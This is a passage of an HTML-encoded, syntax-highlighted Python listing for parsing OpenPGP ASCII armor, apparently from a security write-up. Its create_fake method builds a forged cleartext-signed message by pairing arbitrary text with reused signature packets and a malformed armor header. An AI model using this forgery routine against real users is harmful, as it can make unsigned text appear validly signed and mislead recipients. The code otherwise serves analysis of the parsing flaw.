=3D"color:#E6EDF3"> enum </span><span style=3D"color:#FF7B72">import</span>=
<span style=3D"color:#E6EDF3"> Enum</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">from</span><span style=
=3D"color:#E6EDF3"> packets </span><span style=3D"color:#FF7B72">import</sp=
an><span style=3D"color:#E6EDF3"> Packets</span></span>
<span class=3D"line"></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">def</span><span style=3D=
"color:#D2A8FF"> crc24</span><span style=3D"color:#E6EDF3">(data: </span><s=
pan style=3D"color:#79C0FF">bytes</span><span style=3D"color:#E6EDF3">, ini=
t: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#FF7=
B72"> =3D</span><span style=3D"color:#FF7B72"> 0x</span><span style=3D"colo=
r:#79C0FF">B704CE</span><span style=3D"color:#E6EDF3">, poly: </span><span =
style=3D"color:#79C0FF">int</span><span style=3D"color:#FF7B72"> =3D</span>=
<span style=3D"color:#FF7B72"> 0x</span><span style=3D"color:#79C0FF">1864C=
FB</span><span style=3D"color:#E6EDF3">) -> </span><span style=3D"color:#79=
C0FF">int</span><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    result </span><span =
style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> init</span=
></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    for</span><span styl=
e=3D"color:#E6EDF3"> byte </span><span style=3D"color:#FF7B72">in</span><sp=
an style=3D"color:#E6EDF3"> data:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        result </span><s=
pan style=3D"color:#FF7B72">^=3D</span><span style=3D"color:#E6EDF3"> byte =
</span><span style=3D"color:#FF7B72">&#x3C;&#x3C;</span><span style=3D"colo=
r:#79C0FF"> 16</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        for</span><span =
style=3D"color:#E6EDF3"> bit </span><span style=3D"color:#FF7B72">in</span>=
<span style=3D"color:#79C0FF"> range</span><span style=3D"color:#E6EDF3">(<=
/span><span style=3D"color:#79C0FF">8</span><span style=3D"color:#E6EDF3">)=
:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            result </spa=
n><span style=3D"color:#FF7B72">&#x3C;&#x3C;=3D</span><span style=3D"color:=
#79C0FF"> 1</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            if</span><sp=
an style=3D"color:#E6EDF3"> (result </span><span style=3D"color:#FF7B72">&#=
x26;</span><span style=3D"color:#FF7B72"> 0x</span><span style=3D"color:#79=
C0FF">1000000</span><span style=3D"color:#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                result <=
/span><span style=3D"color:#FF7B72">^=3D</span><span style=3D"color:#E6EDF3=
"> poly</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    return</span><span s=
tyle=3D"color:#E6EDF3"> result </span><span style=3D"color:#FF7B72">&#x26;<=
/span><span style=3D"color:#FF7B72"> 0x</span><span style=3D"color:#79C0FF"=
>FFFFFF</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">class</span><span style=
=3D"color:#FFA657"> ArmorHeaderTag</span><span style=3D"color:#E6EDF3">(</s=
pan><span style=3D"color:#79C0FF">str</span><span style=3D"color:#E6EDF3">,=
 </span><span style=3D"color:#79C0FF">Enum</span><span style=3D"color:#E6ED=
F3">):</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    Version </span><span=
 style=3D"color:#FF7B72">=3D</span><span style=3D"color:#A5D6FF"> "Version"=
</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    Comment </span><span=
 style=3D"color:#FF7B72">=3D</span><span style=3D"color:#A5D6FF"> "Comment"=
</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    MessageID </span><sp=
an style=3D"color:#FF7B72">=3D</span><span style=3D"color:#A5D6FF"> "Messag=
eID"</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    Hash </span><span st=
yle=3D"color:#FF7B72">=3D</span><span style=3D"color:#A5D6FF"> "Hash"</span=
></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    Charset </span><span=
 style=3D"color:#FF7B72">=3D</span><span style=3D"color:#A5D6FF"> "Charset"=
</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    NotDashEscaped </spa=
n><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#A5D6FF"> "N=
otDashEscaped"</span></span>
<span class=3D"line"></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">class</span><span style=
=3D"color:#FFA657"> ArmorHeader</span><span style=3D"color:#E6EDF3">:</span=
></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    tag: ArmorHeaderTag<=
/span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    value: </span><span =
style=3D"color:#79C0FF">str</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#79C0FF"> __init__</span><span style=3D"color:#E6EDF3">(self, li=
ne: </span><span style=3D"color:#79C0FF">str</span><span style=3D"color:#E6=
EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        parts </span><sp=
an style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> line.sp=
lit(</span><span style=3D"color:#A5D6FF">":"</span><span style=3D"color:#E6=
EDF3">, </span><span style=3D"color:#79C0FF">1</span><span style=3D"color:#=
E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        if</span><span s=
tyle=3D"color:#79C0FF"> len</span><span style=3D"color:#E6EDF3">(parts) </s=
pan><span style=3D"color:#FF7B72">=3D=3D</span><span style=3D"color:#79C0FF=
"> 2</span><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">            self</span><=
span style=3D"color:#E6EDF3">.tag </span><span style=3D"color:#FF7B72">=3D<=
/span><span style=3D"color:#E6EDF3"> ArmorHeaderTag(parts[</span><span styl=
e=3D"color:#79C0FF">0</span><span style=3D"color:#E6EDF3">])</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">            self</span><=
span style=3D"color:#E6EDF3">.value </span><span style=3D"color:#FF7B72">=
=3D</span><span style=3D"color:#E6EDF3"> parts[</span><span style=3D"color:=
#79C0FF">1</span><span style=3D"color:#E6EDF3">].strip()</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        else</span><span=
 style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            raise</span>=
<span style=3D"color:#79C0FF"> Exception</span><span style=3D"color:#E6EDF3=
">(</span><span style=3D"color:#FF7B72">f</span><span style=3D"color:#A5D6F=
F">"Invalid Header: At least one colon (':') expected"</span><span style=3D=
"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#79C0FF"> __str__</span><span style=3D"color:#E6EDF3">(self) -> =
</span><span style=3D"color:#79C0FF">str</span><span style=3D"color:#E6EDF3=
">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#FF7B72"> f</span><span style=3D"color:#A5D6FF">"</span><=
span style=3D"color:#FF7B72">&#123;</span><span style=3D"color:#79C0FF">sel=
f</span><span style=3D"color:#E6EDF3">.tag.value</span><span style=3D"color=
:#FF7B72">&#125;</span><span style=3D"color:#A5D6FF">: </span><span style=
=3D"color:#FF7B72">&#123;</span><span style=3D"color:#79C0FF">self</span><s=
pan style=3D"color:#E6EDF3">.value</span><span style=3D"color:#FF7B72">&#12=
5;</span><span style=3D"color:#A5D6FF">"</span></span>
<span class=3D"line"></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">class</span><span style=
=3D"color:#FFA657"> ArmorSectionType</span><span style=3D"color:#E6EDF3">(<=
/span><span style=3D"color:#79C0FF">str</span><span style=3D"color:#E6EDF3"=
>, </span><span style=3D"color:#79C0FF">Enum</span><span style=3D"color:#E6=
EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">    PGP_MESSAGE</span><s=
pan style=3D"color:#FF7B72"> =3D</span><span style=3D"color:#A5D6FF"> "PGP =
MESSAGE"</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">    PGP_PUBLIC_KEY_BLOCK=
</span><span style=3D"color:#FF7B72"> =3D</span><span style=3D"color:#A5D6F=
F"> "PGP PUBLIC KEY BLOCK"</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">    PGP_PRIVATE_KEY_BLOC=
K</span><span style=3D"color:#FF7B72"> =3D</span><span style=3D"color:#A5D6=
FF"> "PGP PRIVATE KEY BLOCK"</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">    PGP_SIGNATURE</span>=
<span style=3D"color:#FF7B72"> =3D</span><span style=3D"color:#A5D6FF"> "PG=
P SIGNATURE"</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">    PGP_SIGNED_MESSAGE</=
span><span style=3D"color:#FF7B72"> =3D</span><span style=3D"color:#A5D6FF"=
> "PGP SIGNED MESSAGE"</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">    PGP_ARMORED_FILE</sp=
an><span style=3D"color:#FF7B72"> =3D</span><span style=3D"color:#A5D6FF"> =
"PGP ARMORED FILE"</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> is_binary</span><span style=3D"color:#E6EDF3">(self) -=
> </span><span style=3D"color:#79C0FF">bool</span><span style=3D"color:#E6E=
DF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        match</span><spa=
n style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">:</span=
></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> ArmorSectionType.</span><span style=3D"color:=
#79C0FF">PGP_PUBLIC_KEY_BLOCK</span><span style=3D"color:#FF7B72"> |</span>=
<span style=3D"color:#E6EDF3"> ArmorSectionType.</span><span style=3D"color=
:#79C0FF">PGP_PRIVATE_KEY_BLOCK</span><span style=3D"color:#FF7B72"> |</spa=
n><span style=3D"color:#E6EDF3"> ArmorSectionType.</span><span style=3D"col=
or:#79C0FF">PGP_SIGNATURE</span><span style=3D"color:#E6EDF3">:</span></spa=
n>
<span class=3D"line"><span style=3D"color:#FF7B72">                return</=
span><span style=3D"color:#79C0FF"> True</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> _:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                return</=
span><span style=3D"color:#79C0FF"> False</span></span>
<span class=3D"line"></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">class</span><span style=
=3D"color:#FFA657"> ArmorSection</span><span style=3D"color:#E6EDF3">:</spa=
n></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    section_type: ArmorS=
ectionType</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    headers: list[ArmorH=
eader]</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    message: </span><spa=
n style=3D"color:#79C0FF">str</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    data: list[</span><s=
pan style=3D"color:#79C0FF">bytes</span><span style=3D"color:#E6EDF3">]</sp=
an></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#79C0FF"> __init__</span><span style=3D"color:#E6EDF3">(self, se=
ction_type: ArmorSectionType):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.section_type </span><span style=3D"color:#FF7B72"=
>=3D</span><span style=3D"color:#E6EDF3"> section_type</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.headers </span><span style=3D"color:#FF7B72">=3D<=
/span><span style=3D"color:#E6EDF3"> []</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.message </span><span style=3D"color:#FF7B72">=3D<=
/span><span style=3D"color:#A5D6FF"> ""</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.data </span><span style=3D"color:#FF7B72">=3D</sp=
an><span style=3D"color:#E6EDF3"> []</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#79C0FF"> __str__</span><span style=3D"color:#E6EDF3">(self) -> =
</span><span style=3D"color:#79C0FF">str</span><span style=3D"color:#E6EDF3=
">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        if</span><span s=
tyle=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.is_binary=
():</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            message </sp=
an><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#A5D6FF"> "=
Binary &#123;</span><span style=3D"color:#FF7B72">&#92;n</span><span style=
=3D"color:#A5D6FF">"</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            for</span><s=
pan style=3D"color:#E6EDF3"> data </span><span style=3D"color:#FF7B72">in</=
span><span style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3=
">.data:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                message =
</span><span style=3D"color:#FF7B72">+=3D</span><span style=3D"color:#FF7B7=
2"> f</span><span style=3D"color:#A5D6FF">"    (</span><span style=3D"color=
:#FF7B72">&#123;</span><span style=3D"color:#79C0FF">len</span><span style=
=3D"color:#E6EDF3">(data)</span><span style=3D"color:#FF7B72">&#125;</span>=
<span style=3D"color:#A5D6FF">): </span><span style=3D"color:#FF7B72">&#123=
;</span><span style=3D"color:#E6EDF3">data.hex()</span><span style=3D"color=
:#FF7B72">&#125;</span><span style=3D"color:#A5D6FF">,</span><span style=3D=
"color:#FF7B72">&#92;n</span><span style=3D"color:#A5D6FF">"</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            message </sp=
an><span style=3D"color:#FF7B72">+=3D</span><span style=3D"color:#A5D6FF"> =
"&#125;"</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            return</span=
><span style=3D"color:#E6EDF3"> message</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        else</span><span=
 style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            message </sp=
an><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#A5D6FF"> "=
Cleartext &#123;</span><span style=3D"color:#FF7B72">&#92;n</span><span sty=
le=3D"color:#A5D6FF">"</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            message </sp=
an><span style=3D"color:#FF7B72">+=3D</span><span style=3D"color:#A5D6FF"> =
"    headers: &#123;</span><span style=3D"color:#FF7B72">&#92;n</span><span=
 style=3D"color:#A5D6FF">"</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            for</span><s=
pan style=3D"color:#E6EDF3"> header </span><span style=3D"color:#FF7B72">in=
</span><span style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6ED=
F3">.headers:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                message =
</span><span style=3D"color:#FF7B72">+=3D</span><span style=3D"color:#FF7B7=
2"> f</span><span style=3D"color:#A5D6FF">"        </span><span style=3D"co=
lor:#FF7B72">&#123;</span><span style=3D"color:#E6EDF3">header</span><span =
style=3D"color:#FF7B72">&#125;</span><span style=3D"color:#A5D6FF">,</span>=
<span style=3D"color:#FF7B72">&#92;n</span><span style=3D"color:#A5D6FF">"<=
/span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            message </sp=
an><span style=3D"color:#FF7B72">+=3D</span><span style=3D"color:#A5D6FF"> =
"    &#125;,</span><span style=3D"color:#FF7B72">&#92;n</span><span style=
=3D"color:#A5D6FF">"</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            message </sp=
an><span style=3D"color:#FF7B72">+=3D</span><span style=3D"color:#FF7B72"> =
f</span><span style=3D"color:#A5D6FF">"    message: </span><span style=3D"c=
olor:#FF7B72">&#123;</span><span style=3D"color:#79C0FF">repr</span><span s=
tyle=3D"color:#E6EDF3">(</span><span style=3D"color:#79C0FF">self</span><sp=
an style=3D"color:#E6EDF3">.message)</span><span style=3D"color:#FF7B72">&#=
125;</span><span style=3D"color:#A5D6FF">,</span><span style=3D"color:#FF7B=
72">&#92;n</span><span style=3D"color:#A5D6FF">"</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            message </sp=
an><span style=3D"color:#FF7B72">+=3D</span><span style=3D"color:#A5D6FF"> =
"&#125;"</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            return</span=
><span style=3D"color:#E6EDF3"> message</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> finalise</span><span style=3D"color:#E6EDF3">(self):</=
span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        if</span><span s=
tyle=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.is_binary=
() </span><span style=3D"color:#FF7B72">and</span><span style=3D"color:#79C=
0FF"> self</span><span style=3D"color:#E6EDF3">.message </span><span style=
=3D"color:#FF7B72">!=3D</span><span style=3D"color:#A5D6FF"> ""</span><span=
 style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            data </span>=
<span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> b64d=
ecode(</span><span style=3D"color:#79C0FF">self</span><span style=3D"color:=
#E6EDF3">.message)</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">            self</span><=
span style=3D"color:#E6EDF3">.data.append(data)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> is_binary</span><span style=3D"color:#E6EDF3">(self) -=
> </span><span style=3D"color:#79C0FF">bool</span><span style=3D"color:#E6E=
DF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.secti=
on_type.is_binary()</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> create_fake</span><span style=3D"color:#E6EDF3">(</spa=
n></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        self,</span></sp=
an>
<span class=3D"line"><span style=3D"color:#E6EDF3">        out_path: </span=
><span style=3D"color:#79C0FF">str</span><span style=3D"color:#E6EDF3">,</s=
pan></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        signature_packet=
s: Packets,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        fake_message: </=
span><span style=3D"color:#79C0FF">str</span><span style=3D"color:#FF7B72">=
 =3D</span><span style=3D"color:#A5D6FF"> "&#x3C;insert your message here>"=
</span><span style=3D"color:#E6EDF3">,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    ):</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        with</span><span=
 style=3D"color:#79C0FF"> open</span><span style=3D"color:#E6EDF3">(out_pat=
h, </span><span style=3D"color:#A5D6FF">"w"</span><span style=3D"color:#E6E=
DF3">) </span><span style=3D"color:#FF7B72">as</span><span style=3D"color:#=
E6EDF3"> fake_output:</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">            # Note the e=
xtra &#96;-&#96; at the end:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            fake_output.=
write(</span><span style=3D"color:#A5D6FF">"-----BEGIN PGP SIGNED MESSAGE--=
----</span><span style=3D"color:#FF7B72">&#92;n</span><span style=3D"color:=
#A5D6FF">"</span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            for</span><s=
pan style=3D"color:#E6EDF3"> header </span><span style=3D"color:#FF7B72">in=
</span><span style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6ED=
F3">.headers:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                fake_out=
put.write(</span><span style=3D"color:#FF7B72">f</span><span style=3D"color=
:#A5D6FF">"</span><span style=3D"color:#FF7B72">&#123;</span><span style=3D=
"color:#E6EDF3">header</span><span style=3D"color:#FF7B72">&#125;&#92;n</sp=
an><span style=3D"color:#A5D6FF">"</span><span style=3D"color:#E6EDF3">)</s=
pan></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            fake_output.=
write(</span><span style=3D"color:#FF7B72">f</span><span style=3D"color:#A5=
D6FF">"</span><span style=3D"color:#FF7B72">&#92;n&#123;</span><span style=
=3D"color:#E6EDF3">fake_message</span><span style=3D"color:#FF7B72">&#125;&=
#92;n</span><span style=3D"color:#A5D6FF">"</span><span style=3D"color:#E6E=
DF3">)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            fake_output.=
write(</span><span style=3D"color:#A5D6FF">"-----BEGIN PGP SIGNATURE-----</=
span><span style=3D"color:#FF7B72">&#92;n&#92;n</span><span style=3D"color:=
#A5D6FF">"</span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            data </span>=
<span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> byte=
s</span><span style=3D"color:#E6EDF3">(signature_packets)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            b64_data </s=
pan><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> =
standard_b64encode(data).decode(</span><span style=3D"color:#A5D6FF">"utf8"=
</span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            while</span>=
<span style=3D"color:#79C0FF"> len</span><span style=3D"color:#E6EDF3">(b64=
_data) </span><span style=3D"color:#FF7B72">>=3D</span><span style=3D"color=
:#79C0FF"> 64</span><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                fake_out=
put.write(</span><span style=3D"color:#FF7B72">f</span><span style=3D"color=
:#A5D6FF">"</span><span style=3D"color:#FF7B72">&#123;</span><span style=3D=
"color:#E6EDF3">b64_data[:</span><span style=3D"color:#79C0FF">64</span><sp=
an style=3D"color:#E6EDF3">]</span><span style=3D"color:#FF7B72">&#125;&#92=
;n</span><span style=3D"color:#A5D6FF">"</span><span style=3D"color:#E6EDF3=
">)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                b64_data=
 </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF=
3"> b64_data[</span><span style=3D"color:#79C0FF">64</span><span style=3D"c=
olor:#E6EDF3">:]</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            fake_output.=
write(</span><span style=3D"color:#FF7B72">f</span><span style=3D"color:#A5=
D6FF">"</span><span style=3D"color:#FF7B72">&#123;</span><span style=3D"col=
or:#E6EDF3">b64_data[:</span><span style=3D"color:#79C0FF">64</span><span s=
tyle=3D"color:#E6EDF3">]</span><span style=3D"color:#FF7B72">&#125;&#92;n</=
span><span style=3D"color:#A5D6FF">"</span><span style=3D"color:#E6EDF3">)<=
/span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            checksum </s=
pan><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> =
crc24(data).to_bytes(</span><span style=3D"color:#FFA657">length</span><spa=
n style=3D"color:#FF7B72"> =3D</span><span style=3D"color:#79C0FF"> 3</span=
><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FFA657">byteo=
rder</span><span style=3D"color:#FF7B72"> =3D</span><span style=3D"color:#A=
5D6FF"> "big"</span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            b64_checksum=
 </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF=
3"> standard_b64encode(checksum).decode(</span><span style=3D"color:#A5D6FF=
">"utf8"</span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            fake_output.=
write(</span><span style=3D"color:#FF7B72">f</span><span style=3D"color:#A5=
D6FF">"=3D</span><span style=3D"color:#FF7B72">&#123;</span><span style=3D"=
color:#E6EDF3">b64_checksum</span><span style=3D"color:#FF7B72">&#125;&#92;=
n</span><span style=3D"color:#A5D6FF">"</span><span style=3D"color:#E6EDF3"=
>)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            fake_output.=
write(</span><span style=3D"color:#A5D6FF">"-----END PGP SIGNATURE-----</sp=
an><span style=3D"color:#FF7B72">&#92;n</span><span style=3D"color:#A5D6FF"=
>"</span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">class</span><span style=
=3D"color:#FFA657"> ArmorExpect</span><span style=3D"color:#E6EDF3">(</span=
><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6EDF3">, </=
span><span style=3D"color:#79C0FF">Enum</span><span style=3D"color:#E6EDF3"=
>):</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    Preamble </span><spa=
n style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> 1</span>=
</span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    Header </span><span =
style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> 2</span></=
span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    Body </span><span st=
yle=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> 3</span></sp=
an>
<span class=3D"line"></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#79C0FF">DASHES</span><span style=
=3D"color:#FF7B72"> =3D</span><span style=3D"color:#79C0FF"> 5</span><span =
style=3D"color:#FF7B72"> *</span><span style=3D"color:#A5D6FF"> "-"</span><=
/span>
<span class=3D"line"><span style=3D"color:#79C0FF">DASH_ESCAPE</span><span =
style=3D"color:#FF7B72"> =3D</span><span style=3D"color:#A5D6FF"> "- "</spa=
n></span>
<span class=3D"line"><span style=3D"color:#79C0FF">BEGIN</span><span style=
=3D"color:#FF7B72"> =3D</span><span style=3D"color:#FF7B72"> f</span><span =
style=3D"color:#A5D6FF">"</span><span style=3D"color:#FF7B72">&#123;</span>=
<span style=3D"color:#79C0FF">DASHES</span><span style=3D"color:#FF7B72">&#=
125;</span><span style=3D"color:#A5D6FF">BEGIN "</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">END</span><span style=3D=
"color:#FF7B72"> =3D</span><span style=3D"color:#FF7B72"> f</span><span sty=
le=3D"color:#A5D6FF">"</span><span style=3D"color:#FF7B72">&#123;</span><sp=
an style=3D"color:#79C0FF">DASHES</span><span style=3D"color:#FF7B72">&#125=
;</span><span style=3D"color:#A5D6FF">END "</span></span>
<span class=3D"line"></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">class</span><span style=
=3D"color:#FFA657"> ArmorParser</span><span style=3D"color:#E6EDF3">:</span=
></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    expect: ArmorExpect<=
/span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    dash_escaping: </spa=
n><span style=3D"color:#79C0FF">bool</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    section: ArmorSectio=
n </span><span style=3D"color:#FF7B72">|</span><span style=3D"color:#79C0FF=
"> None</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    sections: list[Armor=
Section]</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#79C0FF"> __init__</span><span style=3D"color:#E6EDF3">(self):</=
span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.expect </span><span style=3D"color:#FF7B72">=3D</=
span><span style=3D"color:#E6EDF3"> ArmorExpect.Preamble</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.dash_escaping </span><span style=3D"color:#FF7B72=
">=3D</span><span style=3D"color:#79C0FF"> True</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.section </span><span style=3D"color:#FF7B72">=3D<=
/span><span style=3D"color:#79C0FF"> None</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.sections </span><span style=3D"color:#FF7B72">=3D=
</span><span style=3D"color:#E6EDF3"> []</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_line</span><span style=3D"color:#E6EDF3">(self, l=
ine: </span><span style=3D"color:#79C0FF">str</span><span style=3D"color:#E=
6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        line </span><spa=
n style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> line.rst=
rip()</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        match</span><spa=
n style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.expect=
:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
